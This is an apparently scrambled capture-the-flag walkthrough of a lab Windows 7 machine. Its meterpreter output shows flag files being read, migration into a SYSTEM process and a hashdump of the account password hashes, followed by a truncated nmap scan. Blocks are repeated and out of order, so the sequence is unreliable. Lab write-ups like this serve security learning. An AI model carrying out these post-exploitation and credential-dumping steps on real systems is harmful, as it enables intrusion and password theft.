40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Users 40777/rwxrwxrwx 16384 dir 2009-07-13 23:20:08 -0400 Windows 100666/rw-rw-rw- 24 fil 2018-12-12 22:47:39 -0500 flag1.txt 0000/--------- 2141120 fif 1970-01-30 18:20:00 -0500 hiberfil.sys 0000/--------- 2141120 fif 1970-01-30 18:20:00 -0500 pagefile.sys meterpreter \u0026gt; cat flag1.txt flag{access_the_machine}   meterpreter \u0026gt; pwd C:\\Windows\\System32\\config meterpreter \u0026gt; ls Listing: C:\\Windows\\System32\\config =================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 28672 fil 2009-07-14 01:32:39 -0400 BCD-Template 100666/rw-rw-rw- 25600 fil 2009-07-14 01:38:35 -0400 BCD-Template.LOG 100666/rw-rw-rw- 18087936 fil 2009-07-13 22:34:08 -0400 COMPONENTS 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 COMPONENTS.LOG 100666/rw-rw-rw- 13312 fil 2009-07-13 22:34:08 -0400 COMPONENTS.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 COMPONENTS.LOG2 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms 100666/rw-rw-rw- 65536 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf 100666/rw-rw-rw- 65536 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 DEFAULT 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 DEFAULT.LOG 100666/rw-rw-rw- 177152 fil 2009-07-13 22:34:08 -0400 DEFAULT.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 DEFAULT.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:10 -0400 Journal 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 RegBack 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SAM 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 SAM.LOG 100666/rw-rw-rw- 21504 fil 2009-07-13 22:34:08 -0400 SAM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SAM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SECURITY 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SECURITY.LOG 100666/rw-rw-rw- 21504 fil 2009-07-13 22:34:08 -0400 SECURITY.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SECURITY.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:08 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 40632320 fil 2009-07-13 22:34:08 -0400 SOFTWARE 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SOFTWARE.LOG 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SOFTWARE.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SOFTWARE.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 12582912 fil 2009-07-13 22:34:08 -0400 SYSTEM 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SYSTEM.LOG 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 TxR 100666/rw-rw-rw- 34 fil 2018-12-12 22:48:22 -0500 flag2.txt 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 systemprofile meterpreter \u0026gt; cat flag2.txt flag{sam_database_elevated_access}   meterpreter \u0026gt; cd Users lmeterpreter \u0026gt; ls Listing: C:\\Users ================= Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 All Users 40555/r-xr-xr-x 8192 dir 2009-07-13 23:20:08 -0400 Default 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Default User 40777/rwxrwxrwx 8192 dir 2018-12-12 22:13:28 -0500 Jon 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Public 100666/rw-rw-rw- 174 fil 2009-07-14 00:54:24 -0400 desktop.ini meterpreter \u0026gt; cd Jon meterpreter \u0026gt; ls Listing: C:\\Users\\Jon ===================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 AppData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Application Data 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:37 -0500 Contacts 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Cookies 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Desktop 40555/r-xr-xr-x 4096 dir 2018-12-12 22:13:31 -0500 Documents 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Downloads 40555/r-xr-xr-x 4096 dir 2018-12-12 22:13:31 -0500 Favorites 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Links 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Local Settings 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Music 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Documents 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT 100666/rw-rw-rw- 65536 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 NetHood 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Pictures 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 PrintHood 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Recent 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Saved Games 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:45 -0500 Searches 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 SendTo 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Start Menu 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Templates 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Videos 100666/rw-rw-rw- 262144 fil 2018-12-12 22:13:31 -0500 ntuser.dat.LOG1 100666/rw-rw-rw- 0 fil 2018-12-12 22:13:31 -0500 ntuser.dat.LOG2 100666/rw-rw-rw- 20 fil 2018-12-12 22:13:31 -0500 ntuser.ini meterpreter \u0026gt; cd Documents meterpreter \u0026gt; ls Listing: C:\\Users\\Jon\\Documents =============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Music 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Pictures 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Videos 100666/rw-rw-rw- 402 fil 2018-12-12 22:13:45 -0500 desktop.ini 100666/rw-rw-rw- 37 fil 2018-12-12 22:49:18 -0500 flag3.txt meterpreter \u0026gt; cat flag3.txt flag{admin_documents_can_be_valuable}\\Windows\\system32\u0026gt; So, we are in fact system!\nWe enter the command ps to view the running processes  C:\\Windows\\system32\u0026gt;^Z Background channel 1? [y/N] y meterpreter \u0026gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 396 652 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\LogonUI.exe 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 428 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 536 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 552 544 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 600 544 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 612 592 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 652 592 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 700 600 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 708 600 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe 716 600 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe 824 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 892 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 940 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1012 824 WmiPrvSE.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\wbem\\WmiPrvSE.exe 1068 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1160 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 1292 700 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1328 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1380 2856 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 1392 700 amazon-ssm-agent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe 1468 700 LiteAgent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Xentools\\LiteAgent.exe 1588 700 Ec2Config.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe 1780 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1856 2200 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 1936 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1940 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 2144 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2200 700 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 2216 2504 cmd.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\cmd.exe 2328 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 2360 700 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\sppsvc.exe 2428 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 2504 1380 powershell.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe 2560 700 vds.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\vds.exe 2664 700 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchIndexer.exe 2796 1292 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 3020 700 TrustedInstaller.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\servicing\\TrustedInstaller.exe We write down the process id 2796.\nWe migrate to the process whose id we noted:  meterpreter \u0026gt; migrate 2796 [*] Migrating from 2504 to 2796... [*] Migration completed successfully. Task 4: Cracking  We run the command hashdump.  meterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: So the user is Jon.\nWindows uses LM and NTLM hashing. We crack the hashes using hashcat  Task 5: Find flags!    meterpreter \u0026gt; cd C:\\\\ meterpreter \u0026gt; ls Listing: C:\\ ============ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-13 23:18:56 -0400 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:08 -0400 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-12 18:01:17 -0500 System Volume Information 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Users 40777/rwxrwxrwx 16384 dir 2009-07-13 23:20:08 -0400 Windows 100666/rw-rw-rw- 24 fil 2018-12-12 22:47:39 -0500 flag1.txt 0000/--------- 2141120 fif 1970-01-30 18:20:00 -0500 hiberfil.sys 0000/--------- 2141120 fif 1970-01-30 18:20:00 -0500 pagefile.sys meterpreter \u0026gt; cat flag1.txt flag{access_the_machine}   meterpreter \u0026gt; pwd C:\\Windows\\System32\\config meterpreter \u0026gt; ls Listing: C:\\Windows\\System32\\config =================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 28672 fil 2009-07-14 01:32:39 -0400 BCD-Template 100666/rw-rw-rw- 25600 fil 2009-07-14 01:38:35 -0400 BCD-Template.LOG 100666/rw-rw-rw- 18087936 fil 2009-07-13 22:34:08 -0400 COMPONENTS 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 COMPONENTS.LOG 100666/rw-rw-rw- 13312 fil 2009-07-13 22:34:08 -0400 COMPONENTS.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 COMPONENTS.LOG2 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms 100666/rw-rw-rw- 65536 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf 100666/rw-rw-rw- 65536 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 DEFAULT 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 DEFAULT.LOG 100666/rw-rw-rw- 177152 fil 2009-07-13 22:34:08 -0400 DEFAULT.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 DEFAULT.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:10 -0400 Journal 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 RegBack 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SAM 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 SAM.LOG 100666/rw-rw-rw- 21504 fil 2009-07-13 22:34:08 -0400 SAM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SAM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SECURITY 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SECURITY.LOG 100666/rw-rw-rw- 21504 fil 2009-07-13 22:34:08 -0400 SECURITY.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SECURITY.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:08 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 40632320 fil 2009-07-13 22:34:08 -0400 SOFTWARE 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SOFTWARE.LOG 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SOFTWARE.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SOFTWARE.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 12582912 fil 2009-07-13 22:34:08 -0400 SYSTEM 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SYSTEM.LOG 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 TxR 100666/rw-rw-rw- 34 fil 2018-12-12 22:48:22 -0500 flag2.txt 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 systemprofile meterpreter \u0026gt; cat flag2.txt flag{sam_database_elevated_access}   meterpreter \u0026gt; cd Users lmeterpreter \u0026gt; ls Listing: C:\\Users ================= Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 All Users 40555/r-xr-xr-x 8192 dir 2009-07-13 23:20:08 -0400 Default 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Default User 40777/rwxrwxrwx 8192 dir 2018-12-12 22:13:28 -0500 Jon 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Public 100666/rw-rw-rw- 174 fil 2009-07-14 00:54:24 -0400 desktop.ini meterpreter \u0026gt; cd Jon meterpreter \u0026gt; ls Listing: C:\\Users\\Jon ===================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 AppData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Application Data 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:37 -0500 Contacts 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Cookies 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Desktop 40555/r-xr-xr-x 4096 dir 2018-12-12 22:13:31 -0500 Documents 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Downloads 40555/r-xr-xr-x 4096 dir 2018-12-12 22:13:31 -0500 Favorites 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Links 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Local Settings 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Music 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Documents 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT 100666/rw-rw-rw- 65536 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 NetHood 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Pictures 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 PrintHood 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Recent 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Saved Games 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:45 -0500 Searches 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 SendTo 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Start Menu 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Templates 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Videos 100666/rw-rw-rw- 262144 fil 2018-12-12 22:13:31 -0500 ntuser.dat.LOG1 100666/rw-rw-rw- 0 fil 2018-12-12 22:13:31 -0500 ntuser.dat.LOG2 100666/rw-rw-rw- 20 fil 2018-12-12 22:13:31 -0500 ntuser.ini meterpreter \u0026gt; cd Documents meterpreter \u0026gt; ls Listing: Ck 1: 1. We use the usual nmap to scan the machine. Note that it says that the machine does not respond to ICMP requests. So, we have to use ```-Pn``` with nmap for scanning nmap -sC -sV -Pn -oN nmap-out 10.10.221.176\n The results: Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN nmap.out 10.10.221.176 Nmap scan report for 10.10.221.176 Host is up (0.23s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2020-03-25T14:29:02+00:00; +1s from scanner time. 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results: |_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s |_nbstat: NetBIOS name: JON-PC, NetBIOS user: , NetBIOS MAC: 02:d2:17:3d:b2:64 (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: 